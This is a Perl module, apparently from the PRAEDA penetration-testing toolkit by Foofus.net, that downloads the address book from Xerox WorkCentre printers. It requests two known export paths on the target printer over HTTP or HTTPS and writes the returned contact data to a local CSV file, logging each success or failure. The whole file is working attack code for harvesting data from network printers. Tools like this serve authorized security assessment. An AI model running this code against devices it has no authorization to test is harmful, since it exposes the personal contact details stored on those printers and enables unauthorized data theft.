
#Workrkcentra Address Book  Download
######################################################
#                    PRAEDA Module #MP0015           #
#        Copyright (C) 2011 Foofus.net		     #
#              Deral 'percX' Heiland                 #
######################################################
package MP0015;
sub MP0015
{
 
# Set global variables
my $count = 1;
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];
my @PATH = ("properties/Services/EmailSettings/address.csv", "addressbook/exportAddressBook.php");

#Open output file for loging 
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $OUTPUT \n");
     print "\n**********Attempting to enumerate Address Book from Xerox  $TARGET : JOB MP0015**********\n";
     print OUTFILE "\n**********Attempting to enumerate Address Book from Xerox $TARGET : JOB MP0015**********\n";

# Download of Xerox Address Book 
my $browser = LWP::UserAgent->new(timeout => 120);
foreach $path (@PATH)
{
   my $address = $browser->get("http$web://$TARGET:$PORTS/$path");
   open(JOBACCTOUTFILE, ">>./$OUTPUT/$TARGET-$PORTS-address.csv") || die("Failed to open  Output file $TARGET-$PORTS-address.csv \n");
   print JOBACCTOUTFILE $address->content;

  if ($address->is_success) 
     { 
      print "*** Path $path SUCCESS Downloading Xerox address book to $TARGET-$PORTS-address.csv ***\n";
      print OUTFILE "*** Path $path SUCCESS Downloading Xerox address book to $TARGET-$PORTS-address.csv ***\n";
     }
  else { print "Path $path FAILED - " .  $address->code . " : " . $address->message . "\n"; }
}


# operation completed close out output files
close(JOBACCTOUTFILE);
close(OUTFILE);
}
1;

